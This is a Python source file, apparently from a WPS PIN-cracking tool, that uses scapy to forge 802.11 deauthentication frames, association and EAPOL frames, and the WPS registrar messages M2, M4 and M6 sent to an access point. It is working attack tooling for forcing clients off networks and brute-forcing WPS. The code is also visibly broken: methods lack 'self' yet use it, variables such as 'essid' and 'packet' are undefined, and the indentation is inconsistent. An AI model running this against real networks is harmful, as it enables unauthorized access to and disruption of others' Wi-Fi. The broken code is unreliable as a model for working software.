#from core.wpscrypto import WpsCrypto
from scapy.all import *

class Wireless(object):

	def send_deauth(client_mac, bssid):
		deauth = RadioTap() \
				/ Dot11(proto=0L, FCfield=0L, subtype=12L, addr2=self.client_mac, addr3=self.bssid, addr1=self.bssid, SC=0, type=0L, ID=0) \
				/ Dot11Deauth(reason=1)
		
		sendp(deauth, verbose=0)

	def send_auth(client_mac, bssid):
		auth_req = RadioTap() \
		/ Dot11(proto=0L, FCfield=0L, subtype=11L, addr2=self.client_mac, addr3=self.bssid, addr1=self.bssid, SC=0, type=0L) \
		/ Dot11Auth(status=0, seqnum=1, algo=0)

		sendp(auth_req, verbose=0)

	def send_probereq(bssid):
        dst = mac2str(bssid)
        src = mac2str("ff:ff:ff:ff:ff:ff")
        
        packet = Dot11(addr1=dst,addr2=src,addr3=dst) \
        / Dot11ProbeReq() \
		/ Dot11Elt(ID=0,len=len(essid),info=essid) \
		/ Dot11Elt(ID=221,len=9,info="\x00\x50\xF2\x04\x10\x4A\x00\x01\x10")

        send(packet,verbose=0)

	def send_asso_req(client_mac, bssid, ssid):
		# TODO: add 802.11n capabilities 
		association_request = RadioTap() / Dot11(proto=0L, FCfield=0L, subtype=0L, addr2=self.client_mac, addr3=self.bssid, addr1=self.bssid, SC=0, type=0L) \
		/ Dot11AssoReq(listen_interval=5, cap=12548L) \
		/ Dot11Elt(info=self.ssid, ID=0, len=len(self.ssid)) \
		/ Dot11Elt(info='\x02\x04\x0b\x16\x0c\x12\x18$', ID=1, len=8) \
		/ Dot11Elt(info='0H`l', ID=50, len=4) \
		/ Dot11Elt(info='\x00P\xf2\x02\x00\x01\x00', ID=221, len=7) \
		/ Dot11Elt(info='\x00P\xf2\x04\x10J\x00\x01\x10\x10:\x00\x01\x02', ID=221, len=14)

		send(packet,verbose=0)
		

	def send_eapol_start(client_mac, bssid):  
		eapol_start = RadioTap() / Dot11(proto=0L, FCfield=1L, subtype=8L, addr2=self.client_mac, addr3=self.bssid, addr1=self.bssid, SC=0, type=2L, ID=0) \
		/ Dot11QoS(TID=0L, TXOP=0, Reserved=0L, EOSP=0L) \
		/ LLC(dsap=170, ssap=170, ctrl=3) \
		/ SNAP(OUI=0, code=34958) \
		/ EAPOL(version=1, type=1, len=0)

		send(packet,verbose=0)
		
	def send_response_identity(client_mac, bssid):
		response_identity = RadioTap() / Dot11(proto=0L, FCfield=1L, subtype=8L, addr2=self.client_mac, addr3=self.bssid, addr1=self.bssid, SC=0, type=2L, ID=0) \
		/ Dot11QoS(TID=0L, Reserved=0L, TXOP=0, EOSP=0L) \
		/ LLC(dsap=170, ssap=170, ctrl=3) \
		/ SNAP(OUI=0, code=34958) \
		/ EAPOL(version=1, type=0, len=35) \
		/ EAP(code=2, type=1, id=0, len=35) \
		/ Raw(load='WFA-SimpleConfig-Registrar-1-0')

		send(packet,verbose=0)

	def send_M2(ENonce, RNonce):
		if self.ENonce == '':
			print 'enonce is empty!!!'
		
		m2 = [
		[0xFF00, '\x00\x37\x2A'],
		[0xFF01, '\x00\x00\x00\x01'],
		[0xFF02, '\x04'],
		[0xFF03, '\x00'],
		[0x104A, '\x10'],
		# message type:
		[0x1022, '\x05'],
		# enrollee nonce:
		[0x101A, self.ENonce],
		# registrar nonce:
		[0x1039, self.RNonce],
		# uuid registrar:
		[0x1048, '\x12\x34\x56\x78\x9A\xBC\xDE\xF0\x12\x34\x56\x78\x9A\xBC\xDE\xF0'],
		# public key:
		[0x1032, self.PK_R],
		[0x1004, '\x00\x3F'],
		[0x1010, '\x00\x0F'],
		[0x100D, '\x01'],
		[0x1008, '\x01\x08'],
		[0x1021, '\x00'],
		[0x1023, '\x00'],
		[0x1024, '\x00'],
		[0x1042, '\x00'],
		[0x1054, '\x00\x00\x00\x00\x00\x00\x00\x00'],
		[0x1011, '\x00'],
		[0x103C, '\x03'],
		[0x1002, '\x00\x00'],
		[0x1009, '\x00\x00'],
		[0x1012, '\x00\x00'],
		[0x102D, '\x80\x00\x00\x00']
		] 
		
		eap_expanded = self.assemble_EAP_Expanded(m2)
		m = RadioTap() / Dot11(proto=0L, FCfield=1L, addr2=self.client_mac, addr3=self.bssid, addr1=self.bssid, subtype=8L, SC=80, type=2L, ID=55808) \
		/ Dot11QoS(TID=0L, Reserved=0L, TXOP=0, EOSP=0L) / LLC(dsap=170, ssap=170, ctrl=3) \
		/ SNAP(OUI=0, code=34958) \
		/ EAPOL(version=1, type=0, len=383) \
		/ EAP(code=2, type=254, id=self.request_EAP_id, len=383) \
		/ Raw(load=eap_expanded)
		
		authenticator = self.gen_authenticator(str(m[Raw])[9:])
		m = m / Raw(load=(self.assemble_EAP_Expanded([[0x1005, authenticator]])))
		sendp(m, verbose=0)

	def send_M4(self):    
		ConfigData = [[0x103f, self.R_S1]]
		iv, ciphertext = self.encrypt(ConfigData)

		m4 = [
		[0xFF00, '\x00\x37\x2A'],
		[0xFF01, '\x00\x00\x00\x01'],
		[0xFF02, '\x04'],
		[0xFF03, '\x00'],
		[0x104A, '\x10'],
		[0x1022, '\x08'],
		# ENonce
		[0x101A, self.ENonce],
		# RHash1
		[0x103D, self.RHash1],
		# RHash2
		[0x103E, self.RHash2],
		# Encrypted RS1
		[0x1018, iv + ciphertext]
		]
		
		eap_expanded = self.assemble_EAP_Expanded(m4)
		m = RadioTap() / Dot11(proto=0L, FCfield=1L, addr2=self.client_mac, addr3=self.bssid, addr1=self.bssid, subtype=8L, SC=80, type=2L, ID=55808) \
		/ Dot11QoS(TID=0L, Reserved=0L, TXOP=0, EOSP=0L) \
		/ LLC(dsap=170, ssap=170, ctrl=3) \
		/ SNAP(OUI=0, code=34958) \
		/ EAPOL(version=1, type=0, len=196) \
		/ EAP(code=2, type=254, id=self.request_EAP_id, len=196) \
		/ Raw(load=eap_expanded)
		
		authenticator = self.gen_authenticator(str(m[Raw])[9:])
		m = m / Raw(load=(self.assemble_EAP_Expanded([[0x1005, authenticator]])))
		sendp(m, verbose=0)


	def send_M6(self):
		ConfigData = [[0x1040, self.R_S2]]
		iv, ciphertext = self.encrypt(ConfigData)
		m6 = [
		[0xFF00, '\x00\x37\x2A'],
		[0xFF01, '\x00\x00\x00\x01'],
		[0xFF02, '\x04'],
		[0xFF03, '\x00'],
		[0x104A, '\x10'],
		[0x1022, '\x0A'],
		# ENonce
		[0x101A, self.ENonce],
		# Encrypted RS_1
		[0x1018, iv + ciphertext]
		]
		
		eap_expanded = self.assemble_EAP_Expanded(m6)
		m = RadioTap() / Dot11(proto=0L, FCfield=1L, addr2=self.client_mac, addr3=self.bssid, addr1=self.bssid, subtype=8L, SC=80, type=2L, ID=55808) \
		/ Dot11QoS(TID=0L, Reserved=0L, TXOP=0, EOSP=0L) / LLC(dsap=170, ssap=170, ctrl=3) \
		/ SNAP(OUI=0, code=34958) / EAPOL(version=1, type=0, len=124) \
		/ EAP(code=2, type=254, id=self.request_EAP_id, len=124) / Raw(load=eap_expanded)
		authenticator = self.gen_authenticator(str(m[Raw])[9:])
		m = m / Raw(load=(self.assemble_EAP_Expanded([[0x1005, authenticator]])))
		sendp(m, verbose=0)

	def send_wcs_nack(client_mac, bssid):
		self.has_auth_failed = True
		nack = [
		[0xFF00, '\x00\x37\x2A'],
		[0xFF01, '\x00\x00\x00\x01'],
		[0xFF02, '\x03'],
		[0xFF03, '\x00'],
		[0x104A, '\x10'],
		[0x1022, '\x0E'],
		#
		[0x101A, self.ENonce],
		[0x1039, self.RNonce],
		[0x1009, '\x00\x00']
		]
		
		eap_expanded = self.assemble_EAP_Expanded(nack)
		m = RadioTap() / Dot11(proto=0L, FCfield=1L, addr2=self.client_mac, addr3=self.bssid, addr1=self.bssid, subtype=8L, SC=80, type=2L, ID=55808) \
		/ Dot11QoS(TID=0L, Reserved=0L, TXOP=0, EOSP=0L) / LLC(dsap=170, ssap=170, ctrl=3) \
		/ SNAP(OUI=0, code=34958) \
		/ EAPOL(version=1, type=0, len=70) \
		/ EAP(code=2, type=254, id=self.request_EAP_id, len=70) \
		/ Raw(load=eap_expanded)
		if self.verbose: 
			print '-> WCS_NACK'
		sendp(m, verbose=0)
